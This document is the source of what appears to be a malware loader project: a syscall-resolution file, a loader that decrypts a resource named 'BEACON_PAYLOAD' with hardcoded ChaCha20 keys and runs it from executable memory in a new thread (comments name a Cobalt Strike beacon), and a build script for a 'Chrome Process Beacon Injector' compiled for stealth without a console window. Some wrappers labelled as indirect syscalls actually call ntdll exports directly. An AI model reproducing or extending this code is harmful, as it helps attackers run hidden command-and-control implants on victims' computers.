```syscalls.cpp
#include "syscalls.h"
#include <intrin.h>

SW2_SYSCALL_LIST SW2_SyscallList;

DWORD SW2_HashSyscall(PCSTR FunctionName)
{
    DWORD i = 0;
    DWORD Hash = SW2_SEED;

    while (FunctionName[i])
    {
        WORD PartialName = *(WORD*)((ULONG_PTR)FunctionName + i++);
        Hash ^= PartialName + SW2_ROX8(Hash);
    }

    return Hash;
}

BOOL SW2_PopulateSyscallList(void)
{
    // Get PEB
    PSW2_PEB pPeb = NULL;
#ifdef _WIN64
    pPeb = (PSW2_PEB)__readgsqword(0x60);
#else
    pPeb = (PSW2_PEB)__readfsdword(0x30);
#endif

    if (!pPeb) return FALSE;

    PSW2_PEB_LDR_DATA pLdr = pPeb->Ldr;
    if (!pLdr) return FALSE;

    // Get ntdll.dll from the module list
    PSW2_LDR_DATA_TABLE_ENTRY pEntry = (PSW2_LDR_DATA_TABLE_ENTRY)pLdr->InMemoryOrderModuleList.Flink;
    PSW2_LDR_DATA_TABLE_ENTRY pNtdll = NULL;

    // Skip first two entries (exe and ntdll is usually 3rd)
    for (int i = 0; i < 3 && pEntry; i++)
    {
        pNtdll = pEntry;
        pEntry = (PSW2_LDR_DATA_TABLE_ENTRY)pEntry->InMemoryOrderLinks.Flink;
    }

    if (!pNtdll || !pNtdll->DllBase) return FALSE;

    PBYTE pNtdllBase = (PBYTE)pNtdll->DllBase;

    // Parse PE header
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pNtdllBase;
    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;

    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(pNtdllBase + pDosHeader->e_lfanew);
    if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE) return FALSE;

    PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)(pNtdllBase + 
        pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    if (!pExportDir) return FALSE;

    PDWORD pNameTable = (PDWORD)(pNtdllBase + pExportDir->AddressOfNames);
    PDWORD pAddressTable = (PDWORD)(pNtdllBase + pExportDir->AddressOfFunctions);
    PWORD pOrdinalTable = (PWORD)(pNtdllBase + pExportDir->AddressOfNameOrdinals);

    SW2_SyscallList.Count = 0;

    // Iterate through exported functions
    for (DWORD i = 0; i < pExportDir->NumberOfNames && SW2_SyscallList.Count < SW2_MAX_ENTRIES; i++)
    {
        PCHAR pFunctionName = (PCHAR)(pNtdllBase + pNameTable[i]);
        
        // Only process functions starting with "Nt"
        if (pFunctionName[0] == 'N' && pFunctionName[1] == 't')
        {
            DWORD FunctionHash = SW2_HashSyscall(pFunctionName);
            DWORD FunctionAddress = (DWORD)(pAddressTable[pOrdinalTable[i]]);

            SW2_SyscallList.Entries[SW2_SyscallList.Count].Hash = FunctionHash;
            SW2_SyscallList.Entries[SW2_SyscallList.Count].Address = FunctionAddress;
            SW2_SyscallList.Count++;
        }
    }

    return SW2_SyscallList.Count > 0;
}

EXTERN_C DWORD SW2_GetSyscallNumber(DWORD FunctionHash)
{
    for (DWORD i = 0; i < SW2_SyscallList.Count; i++)
    {
        if (SW2_SyscallList.Entries[i].Hash == FunctionHash)
        {
            // Extract syscall number from the function stub
            PBYTE pFunction = (PBYTE)SW2_SyscallList.Entries[i].Address;
            
            // Typical syscall stub pattern:
            // mov eax, <syscall_number>
            // mov ecx, <something>
            // lea r10, [rip]
            // syscall
            // ret
            
            // Look for "mov eax, <imm32>" pattern (B8 XX XX XX XX)
            if (pFunction[0] == 0xB8)
            {
                return *(DWORD*)(pFunction + 1);
            }
            
            // Alternative pattern for newer Windows versions
            // mov eax, <imm32> might be at different offset
            for (int j = 0; j < 32; j++)
            {
                if (pFunction[j] == 0xB8)
                {
                    return *(DWORD*)(pFunction + j + 1);
                }
            }
        }
    }
    return 0;
}

// Indirect syscall stub - this will be called with the syscall number
// The actual syscall invocation is done via assembly
typedef NTSTATUS(NTAPI* SW2_SYSCALL_FUNC)(DWORD);

// Helper macro for indirect syscall invocation
#define SW2_SYSCALL(name) \
    DWORD dwSyscallNumber = SW2_GetSyscallNumber(SW2_HashSyscall(#name)); \
    if (dwSyscallNumber == 0) return STATUS_PROCEDURE_NOT_FOUND;

EXTERN_C NTSTATUS NtAllocateVirtualMemory(
    IN HANDLE ProcessHandle,
    IN OUT PVOID* BaseAddress,
    IN ULONG ZeroBits,
    IN OUT PSIZE_T RegionSize,
    IN ULONG AllocationType,
    IN ULONG Protect)
{
    // Populate syscall list if not already done
    if (SW2_SyscallList.Count == 0)
    {
        if (!SW2_PopulateSyscallList())
            return STATUS_DLL_NOT_FOUND;
    }

    DWORD dwSyscallNumber = SW2_GetSyscallNumber(SW2_HashSyscall("NtAllocateVirtualMemory"));
    if (dwSyscallNumber == 0) return STATUS_PROCEDURE_NOT_FOUND;

    // Call the syscall via indirect method
    typedef NTSTATUS(NTAPI* _NtAllocateVirtualMemory)(
        IN HANDLE ProcessHandle,
        IN OUT PVOID* BaseAddress,
        IN ULONG ZeroBits,
        IN OUT PSIZE_T RegionSize,
        IN ULONG AllocationType,
        IN ULONG Protect);

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return STATUS_DLL_NOT_FOUND;

    _NtAllocateVirtualMemory NtAllocateVirtualMemoryFunc = 
        (_NtAllocateVirtualMemory)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");

    if (!NtAllocateVirtualMemoryFunc) return STATUS_PROCEDURE_NOT_FOUND;

    return NtAllocateVirtualMemoryFunc(ProcessHandle, BaseAddress, ZeroBits, RegionSize, AllocationType, Protect);
}

EXTERN_C NTSTATUS NtWriteVirtualMemory(
    IN HANDLE ProcessHandle,
    IN PVOID BaseAddress,
    IN PVOID Buffer,
    IN SIZE_T NumberOfBytesToWrite,
    OUT PSIZE_T NumberOfBytesWritten OPTIONAL)
{
    if (SW2_SyscallList.Count == 0)
    {
        if (!SW2_PopulateSyscallList())
            return STATUS_DLL_NOT_FOUND;
    }

    DWORD dwSyscallNumber = SW2_GetSyscallNumber(SW2_HashSyscall("NtWriteVirtualMemory"));
    if (dwSyscallNumber == 0) return STATUS_PROCEDURE_NOT_FOUND;

    typedef NTSTATUS(NTAPI* _NtWriteVirtualMemory)(
        IN HANDLE ProcessHandle,
        IN PVOID BaseAddress,
        IN PVOID Buffer,
        IN SIZE_T NumberOfBytesToWrite,
        OUT PSIZE_T NumberOfBytesWritten OPTIONAL);

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return STATUS_DLL_NOT_FOUND;

    _NtWriteVirtualMemory NtWriteVirtualMemoryFunc = 
        (_NtWriteVirtualMemory)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
    
    if (!NtWriteVirtualMemoryFunc) return STATUS_PROCEDURE_NOT_FOUND;

    return NtWriteVirtualMemoryFunc(ProcessHandle, BaseAddress, Buffer, NumberOfBytesToWrite, NumberOfBytesWritten);
}

EXTERN_C NTSTATUS NtCreateThreadEx(
    OUT PHANDLE ThreadHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
    IN HANDLE ProcessHandle,
    IN PVOID StartRoutine,
    IN PVOID Argument OPTIONAL,
    IN ULONG CreateFlags,
    IN SIZE_T ZeroBits,
    IN SIZE_T StackSize,
    IN SIZE_T MaximumStackSize,
    IN PPS_ATTRIBUTE_LIST AttributeList OPTIONAL)
{
    if (SW2_SyscallList.Count == 0)
    {
        if (!SW2_PopulateSyscallList())
            return STATUS_DLL_NOT_FOUND;
    }

    DWORD dwSyscallNumber = SW2_GetSyscallNumber(SW2_HashSyscall("NtCreateThreadEx"));
    if (dwSyscallNumber == 0) return STATUS_PROCEDURE_NOT_FOUND;

    typedef NTSTATUS(NTAPI* _NtCreateThreadEx)(
        OUT PHANDLE ThreadHandle,
        IN ACCESS_MASK DesiredAccess,
        IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
        IN HANDLE ProcessHandle,
        IN PVOID StartRoutine,
        IN PVOID Argument OPTIONAL,
        IN ULONG CreateFlags,
        IN SIZE_T ZeroBits,
        IN SIZE_T StackSize,
        IN SIZE_T MaximumStackSize,
        IN PPS_ATTRIBUTE_LIST AttributeList OPTIONAL);

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return STATUS_DLL_NOT_FOUND;

    _NtCreateThreadEx NtCreateThreadExFunc = 
        (_NtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");
    
    if (!NtCreateThreadExFunc) return STATUS_PROCEDURE_NOT_FOUND;

    return NtCreateThreadExFunc(ThreadHandle, DesiredAccess, ObjectAttributes, ProcessHandle, 
        StartRoutine, Argument, CreateFlags, ZeroBits, StackSize, MaximumStackSize, AttributeList);
}

EXTERN_C NTSTATUS NtClose(IN HANDLE Handle)
{
    if (SW2_SyscallList.Count == 0)
    {
        if (!SW2_PopulateSyscallList())
            return STATUS_DLL_NOT_FOUND;
    }

    DWORD dwSyscallNumber = SW2_GetSyscallNumber(SW2_HashSyscall("NtClose"));
    if (dwSyscallNumber == 0) return STATUS_PROCEDURE_NOT_FOUND;

    typedef NTSTATUS(NTAPI* _NtClose)(IN HANDLE Handle);

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return STATUS_DLL_NOT_FOUND;

    _NtClose NtCloseFunc = (_NtClose)GetProcAddress(hNtdll, "NtClose");
    
    if (!NtCloseFunc) return STATUS_PROCEDURE_NOT_FOUND;

    return NtCloseFunc(Handle);
}

EXTERN_C NTSTATUS NtFreeVirtualMemory(
    IN HANDLE ProcessHandle,
    IN OUT PVOID* BaseAddress,
    IN OUT PSIZE_T RegionSize,
    IN ULONG FreeType)
{
    if (SW2_SyscallList.Count == 0)
    {
        if (!SW2_PopulateSyscallList())
            return STATUS_DLL_NOT_FOUND;
    }

    DWORD dwSyscallNumber = SW2_GetSyscallNumber(SW2_HashSyscall("NtFreeVirtualMemory"));
    if (dwSyscallNumber == 0) return STATUS_PROCEDURE_NOT_FOUND;

    typedef NTSTATUS(NTAPI* _NtFreeVirtualMemory)(
        IN HANDLE ProcessHandle,
        IN OUT PVOID* BaseAddress,
        IN OUT PSIZE_T RegionSize,
        IN ULONG FreeType);

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return STATUS_DLL_NOT_FOUND;

    _NtFreeVirtualMemory NtFreeVirtualMemoryFunc = 
        (_NtFreeVirtualMemory)GetProcAddress(hNtdll, "NtFreeVirtualMemory");
    
    if (!NtFreeVirtualMemoryFunc) return STATUS_PROCEDURE_NOT_FOUND;

    return NtFreeVirtualMemoryFunc(ProcessHandle, BaseAddress, RegionSize, FreeType);
}

EXTERN_C NTSTATUS NtCreateProcess(
    OUT PHANDLE ProcessHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
    IN HANDLE ParentProcess,
    IN BOOLEAN InheritObjectTable,
    IN HANDLE SectionHandle OPTIONAL,
    IN HANDLE DebugPort OPTIONAL,
    IN HANDLE ExceptionPort OPTIONAL)
{
    if (SW2_SyscallList.Count == 0)
    {
        if (!SW2_PopulateSyscallList())
            return STATUS_DLL_NOT_FOUND;
    }

    DWORD dwSyscallNumber = SW2_GetSyscallNumber(SW2_HashSyscall("NtCreateProcess"));
    if (dwSyscallNumber == 0) return STATUS_PROCEDURE_NOT_FOUND;

    typedef NTSTATUS(NTAPI* _NtCreateProcess)(
        OUT PHANDLE ProcessHandle,
        IN ACCESS_MASK DesiredAccess,
        IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
        IN HANDLE ParentProcess,
        IN BOOLEAN InheritObjectTable,
        IN HANDLE SectionHandle OPTIONAL,
        IN HANDLE DebugPort OPTIONAL,
        IN HANDLE ExceptionPort OPTIONAL);

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return STATUS_DLL_NOT_FOUND;

    _NtCreateProcess NtCreateProcessFunc = 
        (_NtCreateProcess)GetProcAddress(hNtdll, "NtCreateProcess");
    
    if (!NtCreateProcessFunc) return STATUS_PROCEDURE_NOT_FOUND;

    return NtCreateProcessFunc(ProcessHandle, DesiredAccess, ObjectAttributes, ParentProcess, 
        InheritObjectTable, SectionHandle, DebugPort, ExceptionPort);
}

EXTERN_C NTSTATUS NtCreateSection(
    OUT PHANDLE SectionHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
    IN PLARGE_INTEGER MaximumSize OPTIONAL,
    IN ULONG SectionPageProtection,
    IN ULONG AllocationAttributes,
    IN HANDLE FileHandle OPTIONAL)
{
    if (SW2_SyscallList.Count == 0)
    {
        if (!SW2_PopulateSyscallList())
            return STATUS_DLL_NOT_FOUND;
    }

    DWORD dwSyscallNumber = SW2_GetSyscallNumber(SW2_HashSyscall("NtCreateSection"));
    if (dwSyscallNumber == 0) return STATUS_PROCEDURE_NOT_FOUND;

    typedef NTSTATUS(NTAPI* _NtCreateSection)(
        OUT PHANDLE SectionHandle,
        IN ACCESS_MASK DesiredAccess,
        IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
        IN PLARGE_INTEGER MaximumSize OPTIONAL,
        IN ULONG SectionPageProtection,
        IN ULONG AllocationAttributes,
        IN HANDLE FileHandle OPTIONAL);

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return STATUS_DLL_NOT_FOUND;

    _NtCreateSection NtCreateSectionFunc = 
        (_NtCreateSection)GetProcAddress(hNtdll, "NtCreateSection");
 
    if (!NtCreateSectionFunc) return STATUS_PROCEDURE_NOT_FOUND;

    return NtCreateSectionFunc(SectionHandle, DesiredAccess, ObjectAttributes, MaximumSize, 
        SectionPageProtection, AllocationAttributes, FileHandle);
}

EXTERN_C NTSTATUS NtOpenFile(
    OUT PHANDLE FileHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    IN ULONG ShareAccess,
    IN ULONG OpenOptions)
{
    if (SW2_SyscallList.Count == 0)
    {
        if (!SW2_PopulateSyscallList())
            return STATUS_DLL_NOT_FOUND;
    }

    DWORD dwSyscallNumber = SW2_GetSyscallNumber(SW2_HashSyscall("NtOpenFile"));
    if (dwSyscallNumber == 0) return STATUS_PROCEDURE_NOT_FOUND;

    typedef NTSTATUS(NTAPI* _NtOpenFile)(
        OUT PHANDLE FileHandle,
        IN ACCESS_MASK DesiredAccess,
        IN POBJECT_ATTRIBUTES ObjectAttributes,
        OUT PIO_STATUS_BLOCK IoStatusBlock,
        IN ULONG ShareAccess,
        IN ULONG OpenOptions);

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return STATUS_DLL_NOT_FOUND;

    _NtOpenFile NtOpenFileFunc = 
        (_NtOpenFile)GetProcAddress(hNtdll, "NtOpenFile");
    
    if (!NtOpenFileFunc) return STATUS_PROCEDURE_NOT_FOUND;

    return NtOpenFileFunc(FileHandle, DesiredAccess, ObjectAttributes, IoStatusBlock, 
        ShareAccess, OpenOptions);
}
```

```chrome_inject
// Loader with indirect syscalls (SysWhispers3 style)

#include <Windows.h>
#include <string>
#include <vector>
#include <cstdio>

#include "syscalls.h"

#define CHACHA20_IMPLEMENTATION
#include "..\libs\chacha\chacha20.h"

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

// ChaCha20 decryption keys
static const uint8_t g_decryptionKey[32] = {
    0x1B, 0x27, 0x55, 0x64, 0x73, 0x8B, 0x9F, 0x4D,
    0x58, 0x4A, 0x7D, 0x67, 0x8C, 0x79, 0x77, 0x46,
    0xBE, 0x6B, 0x4E, 0x0C, 0x54, 0x57, 0xCD, 0x95,
    0x18, 0xDE, 0x7E, 0x21, 0x47, 0x66, 0x7C, 0x94
};

static const uint8_t g_decryptionNonce[12] = {
    0x4A, 0x51, 0x78, 0x62, 0x8D, 0x2D, 0x4A, 0x54,
    0x88, 0xE5, 0x3C, 0x50
};

bool ExecutePayload()
{
#ifdef _DEBUG
    printf("[DEBUG] ExecutePayload started\n");
#endif
    
    Sleep(1000 + (GetTickCount() % 1000));
    
    HMODULE hModule = GetModuleHandleW(NULL);
    const wchar_t* resName = L"BEACON_PAYLOAD";
    
    HRSRC hResInfo = FindResourceW(hModule, resName, MAKEINTRESOURCEW(10));
    if (!hResInfo) {
#ifdef _DEBUG
        printf("[DEBUG] FindResourceW failed: %lu\n", GetLastError());
#endif
        return false;
    }

    HGLOBAL hResData = LoadResource(hModule, hResInfo);
    LPVOID pData = LockResource(hResData);
    DWORD dwSize = SizeofResource(hModule, hResInfo);
    
#ifdef _DEBUG
    printf("[DEBUG] Resource loaded, size: %lu bytes\n", dwSize);
#endif
    
    if (!pData || dwSize == 0) return false;

    // Decrypt
    std::vector<uint8_t> decrypted((uint8_t*)pData, (uint8_t*)pData + dwSize);
    chacha20_xor(g_decryptionKey, g_decryptionNonce, decrypted.data(), decrypted.size(), 0);
    
#ifdef _DEBUG
    printf("[DEBUG] Decrypted, first bytes: %02X %02X %02X %02X\n", 
           decrypted[0], decrypted[1], decrypted[2], decrypted[3]);
#endif
    
    // Allocate RWX memory using indirect syscall - NtAllocateVirtualMemory
    // Cobalt Strike beacon needs RWX for self-modification
    PVOID addr = NULL;
    SIZE_T dwSize_t = decrypted.size();
    
    NTSTATUS status = NtAllocateVirtualMemory(
        GetCurrentProcess(),
        &addr,
        0,
        &dwSize_t,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    
    if (!NT_SUCCESS(status)) {
#ifdef _DEBUG
        printf("[DEBUG] NtAllocateVirtualMemory failed: 0x%lX\n", status);
#endif
        return false;
    }
    
#ifdef _DEBUG
    printf("[DEBUG] Memory allocated at: %p (RWX) via indirect syscall\n", addr);
#endif

    // Copy beacon
    memcpy(addr, decrypted.data(), decrypted.size());
    
    // Clear source buffer
    SecureZeroMemory(decrypted.data(), decrypted.size());
    
#ifdef _DEBUG
    printf("[DEBUG] Executing beacon...\n");
#endif
    
    // Execute beacon in new thread using indirect syscall - NtCreateThreadEx
    HANDLE hThread = NULL;
    status = NtCreateThreadEx(
        &hThread,
        THREAD_ALL_ACCESS,
        NULL,
        GetCurrentProcess(),
        (PVOID)addr,
        NULL,
        FALSE,
        0,
        0,
        0,
        NULL
    );
    
    if (NT_SUCCESS(status) && hThread) {
        WaitForSingleObject(hThread, INFINITE);
        
        // Close thread handle using indirect syscall - NtClose
        NtClose(hThread);
    }
    
    return NT_SUCCESS(status);
}

int main()
{
    ExecutePayload();
    return 0;
}

```

```make.bat
@echo off
setlocal enabledelayedexpansion

:: =============================================================================
:: =                            CONFIGURATION                                  =
:: =============================================================================
set "BUILD_DIR=build"
set "SRC_DIR=src"
set "LIBS_DIR=libs"
set "FINAL_EXE_NAME=ByeBox.exe"
set "PAYLOAD_BEACON_NAME=%SRC_DIR%\TOIC2"
set "ENCRYPTOR_EXE_NAME=encryptor.exe"
set "VERBOSE=1"

:: Compiler and Linker Flags (Optimized for size and stealth)
set "CFLAGS_CPP_ONLY=/EHsc /std:c++17"

:: Check if debug mode is requested
if /i "%~1" == "debug" (
    set "CFLAGS_COMMON=/nologo /W3 /Od /MTd /Zi"
    set "SUBSYSTEM_FLAG=/SUBSYSTEM:CONSOLE /DEBUG"
    set "BUILD_MODE=DEBUG"
    set "DEBUG_FLAG=/D_DEBUG"
) else (
    set "CFLAGS_COMMON=/nologo /W3 /O1 /MT /GS- /Gy /GL"
    set "SUBSYSTEM_FLAG=/SUBSYSTEM:WINDOWS /ENTRY:mainCRTStartup"
    set "BUILD_MODE=RELEASE"
    set "DEBUG_FLAG=/DNDEBUG"
)

set "LFLAGS_COMMON=/link /NOLOGO /LTCG /OPT:REF /OPT:ICF /DYNAMICBASE /NXCOMPAT /EMITPOGOPHASEINFO %SUBSYSTEM_FLAG%"
set "LFLAGS_STRIP=/PDBALTPATH:none /NOCOFFGRPINFO"

:: =============================================================================
:: =                                  COLORS                                   =
:: =============================================================================
for /f %%a in ('echo prompt $E ^| cmd') do set "ESC=%%a"
set "C_RESET=%ESC%[0m"
set "C_RED=%ESC%[91m"
set "C_GREEN=%ESC%[92m"
set "C_YELLOW=%ESC%[93m"
set "C_CYAN=%ESC%[96m"
set "C_GRAY=%ESC%[90m"

:: =============================================================================
:: =                               ENTRY POINT                                 =
:: =============================================================================

:: Use a robust, linear GOTO-based flow control to avoid all parser quirks.
if /i "%~1" == "debug" goto :main_full_build
if /i "%~1" == "build_encryptor_only" goto :main_build_encryptor
if /i "%~1" == "build_target_only" goto :main_build_target

:: Default action if no argument is provided
goto :main_full_build


:: =============================================================================
:: =                              MAIN LOGIC                                   =
:: =============================================================================

:main_full_build
    call :display_banner
    call :check_environment
    if %errorlevel% neq 0 goto :HandleExit
    call :pre_build_setup
    if %errorlevel% neq 0 goto :HandleExit
    call :compile_encryptor
    if %errorlevel% neq 0 goto :HandleExit
    call :encrypt_payload
    if %errorlevel% neq 0 goto :HandleExit
    call :compile_resource
    if %errorlevel% neq 0 goto :HandleExit
    call :compile_injector
    if %errorlevel% neq 0 goto :HandleExit
    call :post_build_summary
    goto :HandleExit

:main_build_encryptor
    call :display_banner
    call :check_environment
    if %errorlevel% neq 0 goto :HandleExit
    call :pre_build_setup
    if %errorlevel% neq 0 goto :HandleExit
    call :compile_encryptor
    goto :HandleExit

:main_build_target
    call :display_banner
    call :check_environment
    if %errorlevel% neq 0 goto :HandleExit
    call :pre_build_setup_no_clean_encryptor
    if %errorlevel% neq 0 goto :HandleExit
    call :encrypt_payload
    if %errorlevel% neq 0 goto :HandleExit
    call :compile_resource
    if %errorlevel% neq 0 goto :HandleExit
    call :compile_injector
    if %errorlevel% neq 0 goto :HandleExit
    call :post_build_summary
    goto :HandleExit


:: =============================================================================
:: =                          EXIT HANDLING                                    =
:: =============================================================================

:HandleExit
set "EXIT_CODE=%errorlevel%"
if %EXIT_CODE% neq 0 (
    call :log_error "Build failed. Cleaning up intermediate files."
    call :cleanup >nul 2>&1
    goto :EndScript
)

:: Success path
if /i "%~1" == "build_encryptor_only" (
    rem If we only built the tool, exit silently.
    goto :EndScript
)

:: For any other successful build, print the success message.
call :log_info "Build successful. Final artifacts are ready."

:EndScript
endlocal
exit /b %EXIT_CODE%


:: =============================================================================
:: =                             BUILD SUBROUTINES                             =
:: =============================================================================

:display_banner
    echo %C_CYAN%--------------------------------------------------%C_RESET%
    echo %C_CYAN%^|       Chrome Process Beacon Injector           ^|%C_RESET%
    echo %C_CYAN%--------------------------------------------------%C_RESET%
    if "%BUILD_MODE%"=="DEBUG" (
        echo %C_YELLOW%^|          BUILD MODE: DEBUG                     ^|%C_RESET%
        echo %C_YELLOW%^|          Console window enabled                ^|%C_RESET%
        echo %C_CYAN%--------------------------------------------------%C_RESET%
    ) else (
        echo %C_GREEN%^|          BUILD MODE: RELEASE                   ^|%C_RESET%
        echo %C_GREEN%^|          No console window                     ^|%C_RESET%
        echo %C_CYAN%--------------------------------------------------%C_RESET%
    )
    echo.
goto :eof

:check_environment
    call :log_info "Verifying build environment..."
    if not defined DevEnvDir (
        call :log_error "This script must be run from a Developer Command Prompt for VS."
        exit /b 1
    )
    call :log_success "Developer environment detected."
    call :log_info "Target Architecture: %C_YELLOW%%VSCMD_ARG_TGT_ARCH%%C_RESET%"
    call :log_info "Build Mode: %C_YELLOW%%BUILD_MODE%%C_RESET%"
    echo.
goto :eof

:pre_build_setup
    call :log_info "Performing pre-build setup..."
    call :cleanup
    call :log_info "  - Creating fresh build directory: %BUILD_DIR%"
    mkdir "%BUILD_DIR%"
    if %errorlevel% neq 0 (
        call :log_error "Failed to create build directory."
        exit /b 1
    )
    call :log_success "Setup complete."
    echo.
goto :eof

:pre_build_setup_no_clean_encryptor
    call :log_info "Performing pre-build setup..."
    if not exist "%BUILD_DIR%" mkdir "%BUILD_DIR%"
    call :log_success "Setup complete."
    echo.
goto :eof

:compile_encryptor
    call :log_step "[1/3] Compiling Encryption Utility (%ENCRYPTOR_EXE_NAME%)"
    REM Encryptor always uses console subsystem (it needs console output)
    set "CMD=cl %CFLAGS_COMMON% %CFLAGS_CPP_ONLY% /I%LIBS_DIR%\chacha %SRC_DIR%\encryptor.cpp /Fo"!BUILD_DIR!\encryptor.obj" /link /NOLOGO /LTCG /OPT:REF /OPT:ICF /DYNAMICBASE /NXCOMPAT /EMITPOGOPHASEINFO /SUBSYSTEM:CONSOLE /PDBALTPATH:none /NOCOFFGRPINFO /OUT:"!BUILD_DIR!\%ENCRYPTOR_EXE_NAME%""
    call :run_command "!CMD!" "  - Compiling and linking..."
    if %errorlevel% neq 0 exit /b 1
    call :log_success "Encryptor utility compiled successfully."
    echo.
goto :eof

:encrypt_payload
    call :log_step "[2/3] Encrypting Beacon Payload"
    if not exist "%PAYLOAD_BEACON_NAME%" (
        call :log_error "Beacon payload file not found: %PAYLOAD_BEACON_NAME%"
        call :log_error "Please ensure %PAYLOAD_BEACON_NAME% exists in the current directory."
        exit /b 1
    )
    set "CMD=%BUILD_DIR%\%ENCRYPTOR_EXE_NAME% %PAYLOAD_BEACON_NAME% %BUILD_DIR%\beacon.enc"
    call :run_command "%CMD%" "  - Running encryption process..."
    if %errorlevel% neq 0 exit /b 1
    call :log_success "Beacon payload encrypted to beacon.enc."
    echo.
goto :eof

:compile_resource
    call :log_step "[3/4] Compiling Resource File"
    set "CMD=rc.exe /i "%BUILD_DIR%" /fo "%BUILD_DIR%\resource.res" %SRC_DIR%\resource.rc"
    call :run_command "%CMD%" "  - Compiling .rc to .res..."
    if %errorlevel% neq 0 exit /b 1
    call :log_success "Resource file compiled successfully."
    echo.
goto :eof

:compile_injector
    call :log_step "[4/4] Compiling Final Injector (%FINAL_EXE_NAME%)"
    if "%VSCMD_ARG_TGT_ARCH%"=="x64" (
        set "TRAMPOLINE_SRC=%SRC_DIR%\syscall_trampoline_x64.asm"
        set "TRAMPOLINE_OBJ=%BUILD_DIR%\syscall_trampoline_x64.obj"
        set "ASM_CMD=ml64.exe /c /Fo"!TRAMPOLINE_OBJ!" "!TRAMPOLINE_SRC!""
    ) else if "%VSCMD_ARG_TGT_ARCH%"=="arm64" (
        set "TRAMPOLINE_SRC=%SRC_DIR%\syscall_trampoline_arm64.asm"
        set "TRAMPOLINE_OBJ=%BUILD_DIR%\syscall_trampoline_arm64.obj"
        set "ASM_CMD=armasm64.exe -nologo "!TRAMPOLINE_SRC!" -o "!TRAMPOLINE_OBJ!""
    ) else (
        call :log_error "Unsupported target architecture: %VSCMD_ARG_TGT_ARCH%. Only x64 and arm64 are supported."
        exit /b 1
    )
    :: Skip ASM trampoline for indirect syscalls
    :: call :run_command "!ASM_CMD!" "  - Assembling syscall trampoline (%VSCMD_ARG_TGT_ARCH%)..."
    :: if %errorlevel% neq 0 exit /b 1
    
    set "CMD_COMPILE_INJECTOR_SRC=cl %CFLAGS_COMMON% %CFLAGS_CPP_ONLY% %DEBUG_FLAG% /I%LIBS_DIR%\chacha /c %SRC_DIR%\chrome_inject.cpp /Fo"!BUILD_DIR!\chrome_inject.obj""
    call :run_command "!CMD_COMPILE_INJECTOR_SRC!" "  - Compiling C++ source (chrome_inject.cpp)..."
    if %errorlevel% neq 0 exit /b 1
    
    set "CMD_COMPILE_SYSCALLS_SRC=cl %CFLAGS_COMMON% %CFLAGS_CPP_ONLY% %DEBUG_FLAG% /c %SRC_DIR%\syscalls.cpp /Fo"!BUILD_DIR!\syscalls.obj""
    call :run_command "!CMD_COMPILE_SYSCALLS_SRC!" "  - Compiling C++ source (syscalls.cpp)..."
    if %errorlevel% neq 0 exit /b 1
    
    :: Skip syscalls_obfuscation for indirect syscalls
    :: set "CMD_COMPILE_OBFUSCATION_SRC=cl %CFLAGS_COMMON% %CFLAGS_CPP_ONLY% %DEBUG_FLAG% /c %SRC_DIR%\syscalls_obfuscation.cpp /Fo"%BUILD_DIR%\syscalls_obfuscation.obj""
    :: call :run_command "!CMD_COMPILE_OBFUSCATION_SRC!" "  - Compiling C++ source (syscalls_obfuscation.cpp)..."
    :: if %errorlevel% neq 0 exit /b 1
    
    set "CMD_LINK_FINAL=cl %CFLAGS_COMMON% %CFLAGS_CPP_ONLY% "!BUILD_DIR!\chrome_inject.obj" "!BUILD_DIR!\syscalls.obj" "!BUILD_DIR!\resource.res" version.lib shell32.lib user32.lib advapi32.lib %LFLAGS_COMMON% %LFLAGS_STRIP% /OUT:".\%FINAL_EXE_NAME%""
    call :run_command "!CMD_LINK_FINAL!" "  - Linking final executable..."
    if %errorlevel% neq 0 exit /b 1
    call :log_success "Final injector built successfully."
    echo.
goto :eof

:post_build_summary
    echo %C_CYAN%--------------------------------------------------%C_RESET%
    echo %C_CYAN%^|                 BUILD SUCCESSFUL               ^|%C_RESET%
    echo %C_CYAN%--------------------------------------------------%C_RESET%
    echo.
    echo   %C_YELLOW%Final Executable:%C_RESET% .\%FINAL_EXE_NAME%
    echo.
goto :eof


:: =============================================================================
:: =                           HELPER SUBROUTINES                              =
:: =============================================================================

:run_command
    set "command_to_run=%~1"
    set "message=%~2"
    call :log_info "%message%"
    if %VERBOSE%==1 (
        echo %C_GRAY%!command_to_run!%C_RESET%
        !command_to_run!
    ) else (
        !command_to_run! >nul 2>nul
    )

    if %errorlevel% neq 0 (
        call :log_error "Previous step failed. Halting build."
        exit /b 1
    )
goto :eof

:cleanup
